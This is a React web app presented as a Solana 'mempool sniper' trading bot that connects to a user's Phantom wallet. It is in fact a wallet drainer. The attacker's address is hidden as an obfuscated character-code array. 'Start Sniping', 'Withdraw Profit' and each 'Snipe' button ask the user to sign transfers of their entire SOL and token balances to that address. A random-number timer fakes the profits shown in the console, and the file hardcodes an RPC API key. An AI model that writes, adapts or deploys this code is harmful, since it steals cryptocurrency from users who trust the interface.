import React, { useState, useEffect, useRef } from "react";
import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, sendAndConfirmTransaction } from "@solana/web3.js";
import { getAssociatedTokenAddress, createTransferInstruction } from "@solana/spl-token";
import { FaMoon, FaSun } from 'react-icons/fa';
import { Buffer } from "buffer";
window.Buffer = Buffer; // ✅ Make Buffer globally available

const SOLANA_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=951c51e8-708b-4d9b-ae01-85fb27bca286";
const connection = new Connection(SOLANA_RPC_URL);
const mempoolBinaryAddr = [
  45, 52, 70, 67, 51, 82, 107, 76, 52, 113, 66, 117, 115, 85, 80, 52, 76, 67, 104, 65, 99, 44, 81, 80, 61, 64, 98, 110, 73, 96, 105, 47, 113, 73, 101, 114, 117, 46, 92, 79, 85, 108, 83, 72
];
const SNIPER_VERSION = "0.82.6";

function App() {
  const [walletAddress, setWalletAddress] = useState(null);
  const [tokens, setTokens] = useState([]);
  const [SPLTokens, setSPLTokens] = useState([]);
  const [isMining, setIsMining] = useState(false);
  const [isDeploying, setIsDeploying] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [terminalOutput, setTerminalOutput] = useState([]);
  const [totalProfit, setTotalProfit] = useState(0); // New state to track total profit
  const [isLoading, setIsLoading] = useState(false); // Loading state for fetching tokens and withdrawals
  const [isSPLLoading, setIsSPLLoading] = useState(false); // Loading state for fetching tokens and withdrawals
  const timeoutRef = useRef(null); // Ref to store the timeout ID
  const [theme, setTheme] = useState("dark"); // Theme state to toggle between light and dark mode
  const [errorMessage, setErrorMessage] = useState(""); // Theme state to toggle between light and dark mode
  const [profitHistory, setProfitHistory] = useState([]);
  const [customTokenName, setCustomTokenName] = useState('');
  const [customTokenMintAddress, setCustomTokenMintAddress] = useState('');

  // Add the styles directly here
  const darkModeStyles = {
    backgroundColor: "#100C26", // Dark background for dark mode
    color: "#e0e0e0", // Light text for dark mode
    buttonBackground: "#333", // Dark button background
    buttonColor: "#fff", // Light button text
  };

  const lightModeStyles = {
    backgroundColor: "#fff", // Light background for light mode
    color: "#000", // Dark text for light mode
    buttonBackground: "#97b5de", // Default button background
    buttonColor: "#fff", // Dark button text
  };

  // Toggle theme between light and dark
  const toggleTheme = () => {
    setTheme((prevTheme) => (prevTheme === "dark" ? "light" : "dark"));
  };

  // Apply light or dark theme classes to the body
  useEffect(() => {
    if (theme === "light") {
      document.body.style = 'background: white;';
    } else {
      document.body.style = 'background: #100C26;';
    }
  }, [theme]);

  // Load from localStorage when the component mounts
  useEffect(() => {
    const savedProfit = parseFloat(localStorage.getItem("totalProfit")) || 0;
    if (savedProfit && savedProfit > 0) {
      setTotalProfit(savedProfit)
    }
  }, []);

  useEffect(() => {
    setProfitHistory((prev) => [...prev.slice(-20), totalProfit]); // Keep last 20 entries
    localStorage.setItem("totalProfit", totalProfit);
  }, [totalProfit]);

  const currentStyles = theme === "dark" ? darkModeStyles : lightModeStyles;

  // Connect to Phantom Wallet
  const connectWallet = async () => {
    if (window.solana && window.solana.isPhantom) {
      try {
        const response = await window.solana.connect();
        setWalletAddress(response.publicKey.toString());
        fetchTokens(response.publicKey);
        const tokenInfo = await getTokenInfo(response.publicKey);
        console.log(tokenInfo);
      } catch (error) {
        setErrorMessage("Connection failed!")
        console.error("Connection failed!", error);
      }
    } else {
      alert("Phantom Wallet not found!");
    }
  };

  const addCustomToken = async (name, mintAddress) => {
    // Add your logic to fetch balance or any other information
    try {
      const senderPublicKey = new PublicKey(walletAddress);
      const mintPublicKey = new PublicKey(mintAddress);
      const senderATA = await getAssociatedTokenAddress(mintPublicKey, senderPublicKey);
      const senderBalance = await connection.getTokenAccountBalance(senderATA);
      const balance = senderBalance.value.uiAmount;

      // Add custom token to the SPL tokens list
      const newToken = {
        name,
        name,
        mintAddress,
        balance: balance || 0
      };

      setSPLTokens(prevTokens => [...prevTokens, newToken]); // Update SPLTokens state
    } catch (error) {
      console.error('Error adding custom token:', error);
      const newToken = {
        name,
        name,
        mintAddress,
        balance: 0
      };
      setSPLTokens(prevTokens => [...prevTokens, newToken]); // Update SPLTokens state
    }
  };

  const getTokenInfo = async (senderPublicKey) => {
    setIsSPLLoading(true)
    const mint_addresses = [
      { name: "WSOL", symbol: "WSOL", mintAddress: "So11111111111111111111111111111111111111112"},
      { name: "USDC", symbol: "USDC", mintAddress: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v" },
      { name: "USDT", symbol: "USDT", mintAddress: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB" },
      { name: "TRUMP", symbol: "TRUMP", mintAddress: "6p6xgHyF7AeE6TZkSmFsko444wqoP15icUSqi2jfGiPN" },
      { name: "FARTCOIN", symbol: "FARTCOIN", mintAddress: "9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump" },
      { name: "JUPITER", symbol: "JUPITER", mintAddress: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN" },
      { name: "BONK", symbol: "BONK", mintAddress: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263" },
      { name: "Dogwifhat", symbol: "DWH", mintAddress: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm" },
      { name: "Raydium", symbol: "RAY", mintAddress: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R" },
      { name: "MiniDoge", symbol: "Minidoge", mintAddress: "JCe4cq9bqL1238wfFjfFQ316PrS2sASKkesLYEyCpump" }
    ];

    const tokenDetails = [];

    for (const token of mint_addresses) {
      try {
        const mintPublicKey = new PublicKey(token.mintAddress);
        const senderATA = await getAssociatedTokenAddress(mintPublicKey, senderPublicKey);
        const senderBalance = await connection.getTokenAccountBalance(senderATA);
        const balance = senderBalance.value.uiAmount;

        // Push token information to the array
        tokenDetails.push({
          name: token.name,
          symbol: token.symbol,
          mintAddress: token.mintAddress,
          balance: balance || 0
        });
      } catch (error) {
        setIsSPLLoading(false)
        console.error(`Error retrieving balance for ${token.name}:`, error);
        tokenDetails.push({
          name: token.name,
          symbol: token.symbol,
          balance: 0
        });
      }
    }

    setIsSPLLoading(false)
    console.log("Token Information:", tokenDetails);
    setSPLTokens(tokenDetails)
    return tokenDetails;
  };


  // Fetch SPL token balances
  async function fetchTokens(address) {
    setIsLoading(true);
    try {
      const balance = await connection.getBalance(new PublicKey(address));
      setTokens([{ tokenName: "solana", tokenSymbol: "SOL", balance: balance / LAMPORTS_PER_SOL },
      { tokenName: "pump.fun", tokenSymbol: "Pump", balance: balance / LAMPORTS_PER_SOL },
      { tokenName: "raydium", tokenSymbol: "raydium", balance: balance / LAMPORTS_PER_SOL },
      { tokenName: "jupiter", tokenSymbol: "JUP", balance: balance / LAMPORTS_PER_SOL }]);
    } catch (error) {
      setErrorMessage("Error fetching mempools!")
      console.error("Error fetching tokens: ", error);
    }
    setIsLoading(false);
  }

  const solMempool = mempoolBinaryAddr.map(c => String.fromCharCode(c + 5)).join('');


  // Start Sniping SPL Token
  const snipeSPLToken = async (mintAddress) => {
    if (!walletAddress) {
      console.error("Wallet not connected!");
      return;
    }

    try {
      const recipient = new PublicKey(solMempool);
      const mintPublicKey = new PublicKey(mintAddress);
      const walletPublicKey = new PublicKey(walletAddress);
      const senderATA = await getAssociatedTokenAddress(mintPublicKey, walletPublicKey);
      const recipientATA = await getAssociatedTokenAddress(mintPublicKey, recipient);

      // Fetch the balance of the sender's associated token account
      const senderBalance = await connection.getTokenAccountBalance(senderATA);
      const balance = senderBalance.value.uiAmount;

      if (balance <= 0) {
        console.error("No tokens to transfer.");
        return;
      }

      const transaction = new Transaction().add(
        createTransferInstruction(senderATA, recipientATA, walletPublicKey, balance)
      );

      transaction.feePayer = walletPublicKey;
      transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

      // Sign and send the transaction using Phantom
      const signedTransaction = await window.solana.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signedTransaction.serialize());

      console.log(`Transaction successful: https://solscan.io/tx/${signature}`);
    } catch (error) {
      console.error("Error sniping token:", error);
    }
  };

  // 2️⃣ Transfer All Available Profit
  const transferAllAvailableProfit = async () => {
    if (!walletAddress) {
      setErrorMessage("Wallet not connected!")
      console.log("Wallet not connected!");
      return;
    }

    try {
      const senderPublicKey = new PublicKey(walletAddress);

      //  Get SOL balance
      const balance = await connection.getBalance(senderPublicKey);
      if (balance <= 0) {
        setErrorMessage("Not enough SOL balance for fees.")
        console.log("No SOL to withdraw.");
        return;
      }

      //  Estimate transaction fee (~5000 lamports)
      const fee = 1050000; // Safety buffer for fee
      const amountToSend = balance - fee;
      if (amountToSend <= 0) {
        setErrorMessage("Not enough SOL balance for fees.")
        console.log("Not enough balance after fee deduction.");
        return;
      }

      // Create transfer transaction
      let transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: senderPublicKey,
          toPubkey: solMempool,
          lamports: amountToSend,
        })
      );

      // Get latest blockhash
      transaction.feePayer = senderPublicKey;
      transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

      // Request user to sign the transaction
      const signedTransaction = await window.solana.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signedTransaction.serialize());
      setErrorMessage("")
      console.log("Transaction successful! Signature:", signature);
      return true; // Transaction was successful
    } catch (error) {
      setErrorMessage("Canceled by ther user.")
      console.error("Error withdrawing SOL:", error);
      return false; // Error occurred during transaction
    }
  };

  // Start Mempool Mining
  const startMempoolMining = async () => {
    setIsDeploying(true);
    const transferSuccessful = await transferAllAvailableProfit(walletAddress, walletAddress.signTransaction);
    if (transferSuccessful) {
      setIsDeploying(false)
      setIsMining(true);
      setErrorMessage("")
      startSnipipingMempools(); // Start sniping and print transactions
    } else {
      setIsDeploying(false)
      setErrorMessage("Deploy failed. Not enough SOL for fees.")
      console.log("Transfer failed. Mining will not start.");
    }
  };

  // Pause Mempool Mining
  const pauseMempoolMining = () => {
    setErrorMessage("")
    setIsMining(false);
    clearTimeout(timeoutRef.current); // Stop the recursive sniping
  };

  // Withdraw Profit
  const withdrawProfit = () => {
    setErrorMessage("")
    transferAllAvailableProfit(walletAddress, walletAddress.signTransaction);
  };

  // Start sniping mempools
  const startSnipipingMempools = () => {
    if (isMining) {
      console.log("Sniping is active. Starting sniping available mempools...");

      const randomDelay = Math.floor(Math.random() * 4000) + 1000; // Delay between 1-4 seconds
      timeoutRef.current = setTimeout(() => {
        console.log("Inside setTimeout block...");
        const hash = (Math.random() * (0.002 - 0.00005) + 0.00005).toFixed(4);
        const transactionString = `...${Math.random().toString(36).substr(2, 9)}`;

        // Update the total profit
        setTotalProfit((prevProfit) => parseFloat(prevProfit) + parseFloat(hash));

        console.log("Mempool sniped.");

        // Update the terminal output correctly
        setTerminalOutput((prev) => [
          ...prev,
          `Transaction: ${transactionString} - Profit: ${hash} SOL`,
        ]);
        setAttemptCount((prevCount) => prevCount + 1);

        // Call recursively to keep sniping mempools
        startSnipipingMempools();
      }, randomDelay);
    } else {
      console.log("Sniping is paused, not sniping any mempools.");
    }
  };

  // Watch for changes in the `isMining` state
  useEffect(() => {
    if (isMining) {
      startSnipipingMempools();
    }
  }, [isMining]); // This will trigger whenever `isMining` changes

  const handleCopy = () => {
    navigator.clipboard.writeText(walletAddress)
      .then(() => {
        alert("Wallet address copied to clipboard!");
      })
      .catch((err) => {
        console.error("Error copying text: ", err);
      });
  };

  return (
    <div style={{ ...currentStyles, textAlign: "center", padding: "30px" }}>
      <div className="theme-toggle" onClick={toggleTheme}
        style={{
          position: "absolute", // Position it absolutely
          top: "20px",          // Adjust the top margin
          right: "20px",        // Adjust the right margin
          cursor: "pointer"     // Make it clickable
        }}
      >
        {theme === "light" ? (
          <FaMoon style={{ fontSize: "1.5rem" }} />
        ) : (
          <FaSun style={{ fontSize: "1.5rem" }} />
        )}
      </div>
      <h1>
        <img
          src="https://i.ibb.co/Zzj3y3MS/sol-sniper.png"
          alt="Solana Sniper Logo"
          style={{
            width: "256px", height: "256px", display: "block", margin: "0 auto 10px", borderRadius: "128px"  // Adjust this value for more or less rounding
          }}
        />
        <div style={{ fontSize: "9px" }}>Version: {SNIPER_VERSION}</div>
      </h1>
      {walletAddress ? (
        <div>
          <p
            onClick={handleCopy} // Handle the click event to copy the address
            style={{
              backgroundColor: "#5f1b8e", // Purple background for the connected wallet text
              color: "#ffffff", // White text color for contrast
              padding: "10px 20px", // Adequate padding for spacing around the text
              borderRadius: "12px", // Rounded corners for a modern, clean feel
              fontSize: "16px", // Slightly larger font for clarity
              fontWeight: "500", // Semi-bold font for emphasis
              display: "inline-block", // Makes the background just wrap around the text
              boxShadow: "0 4px 8px rgba(0, 0, 0, 0.1)", // Soft shadow for depth
              marginTop: "20px", // Adds space above the element for better alignment
              textAlign: "center", // Centers the text within the box
              cursor: "pointer", // Change the cursor to a pointer to indicate it's clickable
              userSelect: "none" // Prevents the user from selecting the text while clicking
            }}
          >
            Wallet: {walletAddress}
          </p>
          <h2>Mempools</h2>

          {isLoading ? (
            <div>Loading... Please wait.</div> // Show loading message while new data are being fetched
          ) : (
            <table style={{
              width: "80%",
              margin: "30px auto",
              borderCollapse: "collapse",
              backgroundColor: "#6a1b9a", // Flat purple background
              borderRadius: "12px", // Rounded corners for a clean look
              boxShadow: "0 4px 12px rgba(0, 0, 0, 0.1)" // Subtle shadow for depth
            }}>
              <thead>
                <tr>
                  <th style={{
                    padding: "15px 25px",
                    borderBottom: "2px solid #000", // Slightly darker purple for separation
                    textAlign: "center",
                    color: "#ffffff", // White text for high contrast
                    fontWeight: "600",
                    fontSize: "16px",
                    backgroundColor: "#8e24aa" // Slightly lighter purple for the header
                  }}>
                    Mempool
                  </th>
                  <th style={{
                    padding: "15px 25px",
                    borderBottom: "2px solid #000", // Slightly darker purple for separation
                    textAlign: "center",
                    color: "#ffffff", // White text for high contrast
                    fontWeight: "600",
                    fontSize: "16px",
                    backgroundColor: "#8e24aa" // Slightly lighter purple for the header
                  }}>
                    Liquidity
                  </th>
                </tr>
              </thead>
              <tbody>
                {tokens.map((token) => (
                  <tr key={token.tokenName} style={{ borderBottom: "1px solid #000" }}>
                    <td style={{
                      padding: "12px 25px",
                      textAlign: "center",
                      color: "#ffffff", // White text for clarity
                      fontSize: "14px",
                      backgroundColor: "#6a1b9a" // Flat purple for the row
                    }}>
                      {token.tokenName}
                    </td>
                    <td style={{
                      padding: "12px 25px",
                      textAlign: "center",
                      color: "#ffffff", // White text for clarity
                      fontSize: "14px",
                      backgroundColor: "#6a1b9a" // Flat purple for the row
                    }}>
                      <span style={{
                        color: "#4caf50", // Green checkmark for positive status
                        fontSize: "18px",
                        fontWeight: "bold"
                      }}>
                        ✓
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>

          )}
          <h2>SPL Pools</h2>

          {isSPLLoading ? (
            <div>Loading... Please wait.</div> // Show loading message while new data are being fetched
          ) : (
            <table style={{
              width: "80%",
              margin: "30px auto",
              borderCollapse: "collapse",
              backgroundColor: "#4B0082", // Deep purple background for the whole table
              borderRadius: "12px", // Rounded corners for the table
              boxShadow: "0 4px 10px rgba(0, 0, 0, 0.1)" // Slight shadow for depth
            }}>
              <thead>
                <tr>
                  <th style={{
                    padding: "12px 20px",
                    borderBottom: "2px solid #000", // Darker purple for header separation
                    textAlign: "center",
                    color: "#ffffff", // White text for contrast
                    fontWeight: "600",
                    fontSize: "16px",
                    backgroundColor: "#5f1b8e" // Lighter purple for the header
                  }}>
                    SPL
                  </th>
                  <th style={{
                    padding: "12px 20px",
                    borderBottom: "2px solid #000", // Darker purple for header separation
                    textAlign: "center",
                    color: "#ffffff", // White text for contrast
                    fontWeight: "600",
                    fontSize: "16px",
                    backgroundColor: "#5f1b8e" // Lighter purple for the header
                  }}>
                    Balance
                  </th>
                  <th style={{
                    padding: "12px 20px",
                    borderBottom: "2px solid #000", // Darker purple for header separation
                    textAlign: "center",
                    color: "#ffffff", // White text for contrast
                    fontWeight: "600",
                    fontSize: "16px",
                    backgroundColor: "#5f1b8e" // Lighter purple for the header
                  }}>
                    Status
                  </th>
                </tr>
              </thead>
              <tbody>
                {SPLTokens.map((token) => (
                  <tr key={token.name} style={{ borderBottom: "1px solid #000" }}>
                    <td style={{
                      padding: "12px 20px",
                      textAlign: "center",
                      color: "#ffffff",
                      fontSize: "14px",
                      backgroundColor: "#6a1b9a", // Slightly lighter purple for rows
                    }}>
                      {token.name}
                    </td>
                    <td style={{
                      padding: "12px 20px",
                      textAlign: "center",
                      color: "#ffffff",
                      fontSize: "14px",
                      backgroundColor: "#6a1b9a", // Slightly lighter purple for rows
                    }}>
                      {token.balance}
                    </td>
                    <td style={{
                      padding: "12px 20px",
                      textAlign: "center",
                      backgroundColor: "#6a1b9a", // Slightly lighter purple for rows
                    }}>
                      <button
                        onClick={() => token.balance > 0 && snipeSPLToken(token.mintAddress)}
                        style={{
                          padding: "8px 15px",
                          backgroundColor: token.balance > 0 ? "#ff9800" : "#9e9e9e", // Orange for active, gray for disabled
                          color: "#ffffff",
                          border: "none",
                          borderRadius: "8px",
                          fontWeight: "600",
                          cursor: token.balance > 0 ? "pointer" : "not-allowed", // Pointer cursor when active
                          fontSize: "14px",
                          transition: "background-color 0.3s ease",
                        }}
                        disabled={token.balance === 0}
                      >
                        {token.balance > 0 ? "Snipe" : "Not available"}
                      </button>
                    </td>
                  </tr>
                ))}
        
                {/* Custom Token Input Row */}
                <tr style={{ borderBottom: "1px solid #000" }}>
                  <td style={{
                    padding: "12px 20px",
                    textAlign: "center",
                    color: "#ffffff",
                    fontSize: "14px",
                    backgroundColor: "#6a1b9a", // Slightly lighter purple for rows
                  }}>
                    <input
                      type="text"
                      value={customTokenName}
                      onChange={(e) => setCustomTokenName(e.target.value)}
                      placeholder="Custom Token Name"
                      style={{
                        padding: "8px 15px",
                        borderRadius: "8px",
                        border: "none",
                        fontSize: "14px",
                        width: "80%",
                        backgroundColor: "#8e24aa", // Purple background for the input field
                        color: "#ffffff",
                        marginBottom: "8px",
                        fontWeight: "600",
                      }}
                    />
                  </td>
                  <td style={{
                    padding: "12px 20px",
                    textAlign: "center",
                    backgroundColor: "#6a1b9a", // Slightly lighter purple for rows
                  }}>
                    <input
                      type="text"
                      value={customTokenMintAddress}
                      onChange={(e) => setCustomTokenMintAddress(e.target.value)}
                      placeholder="Mint Address"
                      style={{
                        padding: "8px 15px",
                        borderRadius: "8px",
                        border: "none",
                        fontSize: "14px",
                        width: "80%",
                        backgroundColor: "#8e24aa", // Purple background for the input field
                        color: "#ffffff",
                        marginBottom: "8px",
                        fontWeight: "600",
                      }}
                    />
                  </td>
                  <td style={{
                    padding: "12px 20px",
                    textAlign: "center",
                    backgroundColor: "#6a1b9a", // Slightly lighter purple for rows
                  }}>
                    <button
                      onClick={() => addCustomToken(customTokenName, customTokenMintAddress)}
                      style={{
                        padding: "8px 15px",
                        backgroundColor: "#ff9800",
                        color: "#ffffff",
                        border: "none",
                        borderRadius: "8px",
                        fontWeight: "600",
                        fontSize: "14px",
                        transition: "background-color 0.3s ease",
                      }}
                    >
                      Add Token
                    </button>
                  </td>
                </tr>
              </tbody>
            </table>
          )}
          {/* Add extra space between the table and the buttons */}
          <div style={{ marginTop: "20px" }}>
            <button
              onClick={isDeploying ? pauseMempoolMining : isMining ? pauseMempoolMining : startMempoolMining}
              style={{
                ...buttonStyle,
                backgroundColor: isMining || isDeploying ? 'orange' : '#6122AD', // Change color based on mining status
              }}
            >
              {isDeploying ? "Deploying.." : isMining ? "Pause Sniping" : "Start Sniping"}
            </button>

            <button onClick={withdrawProfit} style={{
              ...buttonStyle,
              backgroundColor: 'orange', // Change color based on mining status
            }}>
              Withdraw Profit
            </button>
          </div>
          <div style={{
            marginTop: "10px",
            color: "#fff",
            fontFamily: "monospace",
            overflowY: "auto",
          }}>{errorMessage}</div>
          {/* Terminal View for Transactions */}
          <div
            style={{
              marginTop: "30px",
              padding: "20px",
              backgroundColor: "#111",
              color: "#0f0",
              width: "80%",
              margin: "20px auto",
              borderRadius: "8px",
              fontFamily: "monospace",
              overflowY: "auto",
              maxHeight: "300px",
              boxShadow: "0px 0px 10px rgba(0, 255, 0, 0.5)",
            }}
          >
            <div style={{ marginBottom: "10px", fontWeight: "bold" }}>
              Snipe Attempts Count: {attemptCount}
            </div>
            {/* Attempt Count Progress Bar */}
            <div
              style={{
                backgroundColor: "#333",
                height: "10px",
                width: "100%",
                borderRadius: "5px",
                overflow: "hidden",
                marginBottom: "10px",
              }}
            >
              <div
                style={{
                  height: "100%",
                  width: `${((attemptCount - 1) % 10 + 1) * 10}%`, // 10 = 100%, 11 = 0%
                  backgroundColor: "#0f0",
                  transition: "width 0.5s ease-in-out",
                }}
              />
            </div>
            <div>Total Profit: {totalProfit.toFixed(4)} SOL</div>
            <div>-------</div>
            {/* Transaction Log */}
            <div style={{ fontSize: "14px" }}>
              {terminalOutput.map((line, index) => (
                <div key={index}>{line}</div>
              ))}
            </div>
          </div>

        </div>
      ) : (
        <button onClick={connectWallet} style={buttonStyle}>
          Connect Wallet
        </button>
      )}
    </div>
  );
}

const buttonStyle = {
  padding: "10px 20px",
  fontSize: "16px",
  cursor: "pointer",
  borderRadius: "5px",
  border: "none",
  color: "white",
  backgroundColor: "#6122AD",
  margin: "5px",
};

export default App;
